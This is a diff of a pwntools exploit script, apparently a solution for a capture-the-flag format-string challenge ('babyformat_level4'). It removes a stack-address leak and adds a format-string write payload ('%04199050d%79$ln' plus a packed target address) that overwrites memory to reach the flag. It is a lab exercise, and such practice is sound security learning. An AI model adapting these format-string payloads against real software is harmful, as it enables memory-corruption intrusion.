@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template babyformat_level5
+# $ pwn template babyformat_level4
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
+exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level4')
 context.terminal = ["tmux", "splitw", "-h"]
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -47,20 +47,11 @@ io = start()
 # io.send(payload)
 # flag = io.recv(...)
 # log.success(flag)
-
-exploit = f"%150$p"
-
-io.sendline(exploit)
-io.recvuntil(b"Your input is:")
-io.recvline()
-leaked_rbp = io.recvline(keepends=False)
-print(f"leaked rbp : {leaked_rbp}")
-rbp_main = int(leaked_rbp, 16)
-rbp_func = rbp_main - 80 
-print(f"leaked rbp_func : {hex(rbp_func)}")
-leaked_ret = rbp_func + 8
-rip_func = leaked_ret
-print(f"leaked rip_func : {hex(leaked_ret)}")
-
+# Both works
+# buf = b"%04199050d%79$lnAAAAA" + p64(0x404070)
+buf = b"%04199050d%79$lnAAAAA" + p64(0x404070) + b"\n"
+io.recvuntil(b"your input and then exit.")
+io.sendline(buf)
+io.recvuntil(b'flag:')
 io.interactive()
 
